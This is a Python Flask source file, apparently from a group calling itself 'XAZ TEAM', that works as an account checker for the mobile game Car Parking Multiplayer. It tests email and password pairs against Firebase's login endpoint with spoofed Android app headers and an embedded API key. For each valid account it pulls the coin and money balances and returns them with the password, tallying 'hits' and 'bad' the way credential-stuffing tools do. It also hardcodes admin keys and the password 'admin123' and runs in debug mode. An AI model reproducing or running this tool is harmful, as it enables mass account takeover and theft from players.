from flask import Flask, request, jsonify, render_template_string, redirect, url_for
import requests
import json
import datetime
import random
import os
import threading
from colorama import Fore
from cfonts import render, say
from names import get_first_name
from collections import defaultdict

app = Flask(__name__)

# إعدادات الموقع
ADMIN_KEY = "XAZ111MOLPHIDTI65"  # مفتاح الإدارة
ACTIVATION_CODE = "xa776757576z2023"  # كود التفعيل
USER_KEY = "helloxazogoh"  # مفتاح المستخدم
API_KEYS = {}  # تخزين مفاتيح API المؤقتة
IP_TRACKER = defaultdict(list)  # تتبع عناوين IP
STATS = {"hits": 0, "bad": 0}  # إحصائيات الطلبات

# إعدادات API
headers = {
    "Content-Type": "application/json",
    "X-Android-Package": "com.olzhas.carparking.multyplayer",
    "X-Android-Cert": "D4962F8124C2E09A66B97C8E326AFF805489FE39",
    "Accept-Language": "tr-TR, en-US",
    "X-Client-Version": "Android/Fallback/X22001001/FirebaseCore-Android",
    "X-Firebase-GMPID": "1:581727203278:android:af6b7dee042c8df539459f",
    "X-Firebase-Client": "H4sIAAAAAAAAAKtWykhNLCpJSk0sKVayio7VUSpLLSrOzM9TslIyUqoFAFyivEQfAAAA",
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; A5010 Build/PI)",
    "Host": "www.googleapis.com",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
}

# دالة فك التشفير
def decode_nested_json(d):
    for key, value in d.items():
        if isinstance(value, str):
            try:
                nested_value = json.loads(value)
                d[key] = decode_nested_json(nested_value)
            except json.JSONDecodeError:
                continue
        elif isinstance(value, dict):
            d[key] = decode_nested_json(value)
    return d

# دالة تسجيل الدخول
def login(email, password):
    global STATS
    data = {
        "email": email,
        "password": password,
        "returnSecureToken": True,
        "clientType": "CLIENT_TYPE_ANDROID"
    }
    res = requests.post("https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", json=data, headers=headers).json()
    if "idToken" in res:
        tkn = res["idToken"]
        data2 = {
            "idToken": tkn
        }
        res2 = requests.post("https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", json=data2, headers=headers).json()
        deta = res2['users'][0]['createdAt']
        data3 = {
            "data": "2893216D41959108CB8FA08951CB319B7AD80D02"
        }
        he = {
            "authorization": f"Bearer {tkn}",
            "firebase-instance-id-token": "f0Rstd-MTbydQx9M2eLlTM:APA91bF7UdxnXLAaybpBODKCRnyLu44eFWygoIfnLn7kOE9aujlb5WcvTv-EyA5mTNbVBPQ-r-x967XJqEA3TX23gGyXCSbMEEa2PIccvNU98uEcdun1qMgYbCOY4hPBBD2w6G9mfX_m",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.12.13"
        }
        info = requests.post("https://us-central1-cp-multiplayer.cloudfunctions.net/GetPlayerRecords2", json=data3, headers=he).text

        data_account = json.loads(info)
        if 'result' in data_account:
            data_account['result'] = decode_nested_json(json.loads(data_account['result']))

        result_account = data_account["result"]
        try:
            Player_name = result_account['Name']
        except:
            Player_name = 'None'
        try:
            Friends_count = len(result_account['FriendsID'])
        except:
            Friends_count = 'None'
        try:
            Coins = result_account['coin']
        except:
            Coins = 'None'
        try:
            Money = result_account['money']
        except:
            Money = 'None'
        Date_Account = str(datetime.datetime.fromtimestamp(int(deta) / 1000)).split(' ')[0].replace('-.', '/')
        
        # إعداد الاستجابة
        response_data = {
            "status": "success",
            "email": email,
            "password": password,
            "player_name": Player_name,
            "coins": Coins,
            "money": Money,
            "friends_count": Friends_count,
            "account_creation_date": Date_Account,
            "message": "IG: XAZ TEAM"
        }
        STATS["hits"] += 1
        return response_data
    else:
        STATS["bad"] += 1
        return {"status": "failure", "message": "Invalid credentials"}

# الصفحة الرئيسية
@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        password = request.form.get('password')
        activation_code = request.form.get('activation_code')
        if password == "admin123" and activation_code == ACTIVATION_CODE:
            return redirect(url_for('dashboard'))
        else:
            return render_template_string(home_html, error="Invalid password or activation code")
    return render_template_string(home_html)

# لوحة التحكم
@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
    return render_template_string(dashboard_html, stats=STATS, ips=IP_TRACKER)

# API لإضافة مفتاح
@app.route('/add_key', methods=['GET', 'POST'])
def add_key():
    if request.method == 'POST':
        if request.headers.get('Admin-Key') == ADMIN_KEY:
            key = request.json.get('key')
            expiry = request.json.get('expiry')
            API_KEYS[key] = expiry
            return jsonify({"status": "success", "message": "Key added successfully"})
        return jsonify({"status": "failure", "message": "Invalid admin key"})
    else:
        return jsonify({"status": "info", "message": "Send a POST request to add a key"})

# قوالب HTML
home_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XAZ TEAM</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRUGP9IQpVx9j0SXDdkOkAc9RVsxIk5ZfDs1g&s') no-repeat center center fixed;
            background-size: cover;
            color: white;
        }
        .container {
            margin-top: 20%;
            text-align: center;
        }
        .btn-telegram {
            background-color: #0088cc;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>XAZ TEAM</h1>
        <form method="POST">
            <input type="password" name="password" placeholder="Password" required>
            <input type="text" name="activation_code" placeholder="Activation Code" required>
            <button type="submit" class="btn btn-primary">Submit</button>
        </form>
        {% if error %}
            <p style="color: red;">{{ error }}</p>
        {% endif %}
        <a href="https://t.me/xazteam" class="btn-telegram">Join Telegram</a>
    </div>
</body>
</html>
"""

dashboard_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <div class="container">
        <h1>Dashboard</h1>
        <h2>Statistics</h2>
        <p>Total Hits: {{ stats.hits }}</p>
        <p>Total Bad: {{ stats.bad }}</p>
        <h2>IP Tracker</h2>
        <ul>
            {% for ip, details in ips.items() %}
                <li>{{ ip }} - {{ details }}</li>
            {% endfor %}
        </ul>
    </div>
</body>
</html>
"""

# تشغيل التطبيق
if __name__ == '__main__':
    app.run(debug=True)
